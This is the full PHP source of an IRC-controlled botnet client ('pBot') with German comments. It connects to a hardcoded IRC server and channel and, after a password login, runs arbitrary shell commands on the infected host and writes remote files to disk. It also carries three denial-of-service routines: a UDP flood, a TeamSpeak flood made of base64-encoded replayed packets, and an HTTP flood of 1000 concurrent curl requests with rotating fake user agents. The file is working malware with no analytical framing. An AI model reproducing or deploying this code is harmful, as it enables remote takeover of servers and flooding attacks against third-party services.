<?php

set_time_limit(0);
error_reporting(0);

class pBot
{	
var $config = array("server"=>"46.105.132.33",
"port"=>6667,
"pass"=>"",
"prefix"=>"",
"maxrand"=>8,
"chan"=>"#martin",
"key"=>"",
"modes"=>"+p",
"password"=>"martin",
"trigger"=>".",
"hostauth"=>"*"
);
var $users = array();
function start()
 {
    while(true)
        {
            if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) $this->start();
                $pass = $this->config['password'];
            $alph = range("0","9");
                $this->send("PASS ".$pass."");
                if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') $ident = "Windows";
                else $ident = "Linux";
            $this->send("USER ".$ident." 127.0.0.1 localhost :".php_uname()."");
            $this->set_nick();
            $this->main();
        }
}
function main()
{
while(!feof($this->conn))
{
$this->buf = trim(fgets($this->conn,512));
$cmd = explode(" ",$this->buf);
if(substr($this->buf,0,6)=="PING :")
{
$this->send("PONG :".substr($this->buf,6));
}
if(isset($cmd[1]) && $cmd[1] =="001")
{
$this->send("MODE ".$this->nick." ".$this->config['modes']);
$this->join($this->config['chan'],$this->config['key']);
}
if(isset($cmd[1]) && $cmd[1]=="433")
{
$this->set_nick();
}
if($this->buf != $old_buf)
{
$mcmd = array();
$msg = substr(strstr($this->buf," :"),2);
$msgcmd = explode(" ",$msg);
$nick = explode("!",$cmd[0]);
$vhost = explode("@",$nick[1]);
$vhost = $vhost[1];
$nick = substr($nick[0],1);
$host = $cmd[0];
if($msgcmd[0]==$this->nick)
{
for($i=0;$i<count($msgcmd);$i++)
$mcmd[$i] = $msgcmd[$i+1];
}
else
{
for($i=0;$i<count($msgcmd);$i++)
$mcmd[$i] = $msgcmd[$i];
}
if(count($cmd)>2)
{
switch($cmd[1])
{
// EINGLOGGFUNKTION
case "PRIVMSG":
if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] ||

$this->config['hostauth'] == "*"))
{
if(substr($mcmd[0],0,1)==".")
{
switch(substr($mcmd[0],1))
{
case "login":
if($mcmd[1]==$this->config['password'])
{
$this->privmsg($this->config['chan'],"[\2System\2]: erfolgreich eingeloggt!");
$this->log_in($host);
}
else
{
$this->privmsg($this->config['chan'],"[\2System\2]: falsches Passwort!");
}
break;
}
}
}
// BEFEHLE
elseif($this->is_logged_in($host))
{
if(substr($mcmd[0],0,1)==".")
{
switch(substr($mcmd[0],1))
{
// ALLE BOTS NEUSTARTEN
case "neustart":
$this->send("STOPP :Neustart");
fclose($this->conn);
$this->start();
break;
// SERVER BEFEHLE AUSFÃœHREN
case "exec":
$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
$exec = shell_exec($command);
$ret = explode("\n",$exec);
$this->privmsg($this->config['chan'],"[\2System\2]: ausgefÃ¼hrt!");
for($i=0;$i<count($ret);$i++)
if($ret[$i]!=NULL)
$this->privmsg($this->config['chan']," : ".trim($ret[$i]));
break;
// DATEN DOWNLOADEN
case "download":
if(count($mcmd) > 2)
{
if(!$fp = fopen($mcmd[2],"w"))
{
$this->privmsg($this->config['chan'],"[\2System\2]: Kein Download mÃ¶glich. Fehlende Serverrechte!");
}
else
{
if(!$get = file($mcmd[1]))
{
$this->privmsg($this->config['chan'],"[\2System\2]: Kein Download mÃ¶glich!");
}
else
{
for($i=0;$i<=count($get);$i++)
{
fwrite($fp,$get[$i]);
}
$this->privmsg($this->config['chan'],"[\2System\2]: Download abgeschlossen!");
}
fclose($fp);
}
}
break;
// MENÃœ AUFRUFEN
case "hilfe":
$this->privmsg($this->config['chan'],"[\2System - Befehle\2]");
$this->privmsg($this->config['chan'],"[\2UDP\2]: .udpflood IP PACKETE ZEIT !");
$this->privmsg($this->config['chan'],"[\2CLOUDFLARE\2]: .cloudflare IP ZEIT!");
$this->privmsg($this->config['chan'],"[\2TEAMSPEAK\2]: .teamspeak IP PORT ZEIT!");
break;
// BENUTZER AUSLOGGEN
case "ausloggen":
$this->log_out($host);
$this->privmsg($this->config['chan'],"[\2System\2]: Erfolreich ausgeloggt!");
break;
// UDP ATTACKE
case "udpflood":
if(count($mcmd)>3)
{
$this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]);
}
break;
// TS3 ATTACKE
case "teamspeak":
if(count($mcmd)>3)
{
$this->teamspeakflood($mcmd[1],$mcmd[2],$mcmd[3]);
}
break;
// CLOUDFLARE ATTACKE
case "cloudflare":
if(count($mcmd)>2)
{
$this->cloudflare($mcmd[1],$mcmd[2]);
}
break;

}
}
}
break;
}
}
}
$old_buf = $this->buf;
}
$this->start();
}

// PRIVATNACHTICHTEN ANFANG
function send($msg)
{
fwrite($this->conn,"$msg\r\n");
}


// CHANNEL BETRETEN ANFANG
function join($chan,$key=NULL)
{
$this->send("JOIN $chan $key");
}


// PRIVATNACHTICHTEN ANFANG
function privmsg($to,$msg)
{
$this->send("PRIVMSG $to :$msg");
}


// BENUTZER EINGELOGGT ANFANG
function is_logged_in($host)
{
if(isset($this->users[$host]))
return 1;
else
return 0;
}


// VON BOTS EINLOGGEN ANFANG
function log_in($host)
{
$this->users[$host] = true;
}


// VON BOTS AUSLOGGEN ANFANG
function log_out($host)
{
unset($this->users[$host]);
}


// BOT NAME Ã„NDERN ANFANG
public function set_nick() {
        $fp = fsockopen("freegeoip.net", 80, $dummy, $dummy, 30);
        if(!$fp)
            $this->nick = "[UKN]";
        else {
            fclose($fp);
            $ctx = stream_context_create(array(
                'http' => array(
                    'timeout' => 30
                )
            ));
            $buf = file_get_contents("http://freegeoip.net/json/", 0, $ctx);
            if(!strstr($buf, "country_code"))
                $this->nick = "[UKN]";
            else {
                $code       = strstr($buf, "country_code");
                $code       = substr($code, 12);
                $code       = substr($code, 3, 2);
                $this->nick = "[" . $code . "]";
            }
        }
        if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
            $this->nick .= "[WIN32]";
        else
            $this->nick .= "[LINUX]";
        if (isset($_SERVER['SERVER_SOFTWARE'])) {
            if(strstr(strtolower($_SERVER['SERVER_SOFTWARE']), "apache"))
                $this->nick .= "[A]";
            elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']), "iis"))
                $this->nick .= "[I]";
            elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']), "xitami"))
                $this->nick .= "[X]";
            elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']), "nginx"))
                $this->nick .= "[N]";
            else
                $this->nick .= "[U]";
        } 
        $this->nick .= $this->config['prefix'];
        for($i = 0; $i < $this->config['maxrand']; $i++)
            $this->nick .= mt_rand(0, 9);
        $this->send("NICK " . $this->nick);
    }

// UDP ATTACKE ANFANG
function udpflood($host,$packetsize,$time) {
$this->privmsg($this->config['chan'],"[\2UDP-Attacke gestartet!\2]");
$packet = "";
for($i=0;$i<$packetsize;$i++) { $packet .= chr(mt_rand(1,256)); }
$timei = time();
$i = 0;
while(time()-$timei < $time) {
$fp=fsockopen("udp://".$host,mt_rand(0,6000),$e,$s,5);
fwrite($fp,$packet);
fclose($fp);
$i++;
}
$env = $i * $packetsize;
$env = $env / 1048576;
$vel = $env / $time;
$vel = round($vel);
$env = round($env);
$this->privmsg($this->config['chan'],"[\2UDP-Attacke beendet!\2]: $env MB gesendet.

enviados / Media: $vel MB/s ");
}

// TEAMSPEAK ATTACKE ANFANG
function teamspeakflood($host,$port,$time) {	
	
	$end = time() + $time;
	
	$fp = fsockopen("udp://" . $host, $port, $e, $s, 5);
	$inits = array("VFMzSU5JVDEAZQAAiAalP5oAV5QKaSKfQwcAAAAAAAAAAA==",
				   "VFMzSU5JVDEAZQAAiAalP5oCq72VH4ERjMrdhzl5ACxgjAdDnyI=",
				   "VFMzSU5JVDEAZQAAiAalP5oEKZ2bFjjUVrKhYueQRKFORM9YEXdZKBjIRtpYqkhO7+mN45pkEFQUnxbEAiHg/71rXTWm3o5ccYpD77GDfkZzz+DyzUV6W6BGY+w49OebfrVQaqkCriXRZA/fUF104Oa1AKai7gLClB/DkMFjVryH3phFqxgd6uPbnuALaF000X0AACcQ2Bux4HRtXOOJtGK/vaLXkpTM0qeBReFVmuEdcARTzCV1dmwfdeqnOreoFpu1i1VCc+31ktJdXQooSMQdDgehivl3OWge1Y45gWYNcH/dFelTiZ9RVjfqGrHYGo315bucN49EaECeKUXkoi+xkJvHypV3pw6BeDCKsHcv3n9TSgoBcORk2Lr01i0OFKPdDmlQqQkkTl36j2d9u4kcSHU1zWtrCo9jbGllbnRpbml0aXYgYWxwaGE9MmxSNE01VlRQeDF4ZWc9PSBvbWVnYT1NRXNEQWdjQUFnRWdBaUFiSWNCS2VXZEdZbEFMeTZyMDZ6YkQwbm4xY1lWZmdjUnlvSSt0MGJ5cExRSWdldTIxYW5xaVJ1Nlptd0oySFc2ZVwvTXg3NUJqQTdkYm5aWHNZU1YydzVjVT0gaXA9"
				   );
	
	foreach($inits as $init){
		fwrite($fp, $init);
		usleep(20000);
	}
	
	$raw = array("xEVqYFSRWyf/yQAFhf/Y",
				 "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",
				 "xEVqYFSRWyd4NQAFhA=="
				 );
	
				$pack = array();
				
				foreach($raw as $line) {
					array_push($pack, base64_decode($line));
				}
				
				$i = 0;
				
				while(true){
					foreach($pack as $packet) {
						fwrite($fp, $packet);
					}
					fflush($fp);
					if($i % 100 == 0){
						if($end < time()) break;
					}
					$i++;
				}
				fclose($fp);
}

// CLOUDFLARE ATTACKE ANFANG
function cloudflare($site,$time) {	

		$this->privmsg($this->config['chan'],"[\2Cloudflare-Attacke gestartet!\2]");
		
		$useragent = array ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; Avant Browser; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
		"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; .NET CLR 3.5.21022; InfoPath.2)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Avant Browser; Avant Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506; Tablet PC 2.0)",
		"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0",
		"Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
		"Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
		"Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (J2ME/22.478; U; en) Presto/2.5.25 Version/10.54",
		"Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
		"Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
		"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
		"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16");
		
		$endtime = time() + $time;
		while(time() <= $endtime) {
			$mc = curl_multi_init();
			for($thread_no = 0; $thread_no < 1000; $thread_no++) {
				$c[$thread_no] = curl_init();
				curl_setopt($c[$thread_no], CURLOPT_URL, $site);
				curl_setopt($c[$thread_no], CURLOPT_HEADER, 0);
				curl_setopt($c[$thread_no], CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($c[$thread_no], CURLOPT_CONNECTTIMEOUT, 5);
				curl_setopt($c[$thread_no], CURLOPT_TIMEOUT, 10);
				curl_setopt($c[$thread_no], CURLOPT_USERAGENT, $useragent[rand(0,18)]);
				curl_multi_add_handle($mc, $c[$thread_no]);
			}

			do {
				while(($execrun = curl_multi_exec($mc, $running)) == CURLM_CALL_MULTI_PERFORM);
				if($execrun != CURLM_OK) break;
					
				while($done = curl_multi_info_read($mc)) {
					$info = curl_getinfo($done ['handle']);
					if($info['http_code'] == 301) {}
					curl_multi_remove_handle($mc, $done['handle']);
				}
			} while($running);
		
			curl_multi_close($mc);
		}
	
}


}

$bot = new pBot;
$bot->start();

?>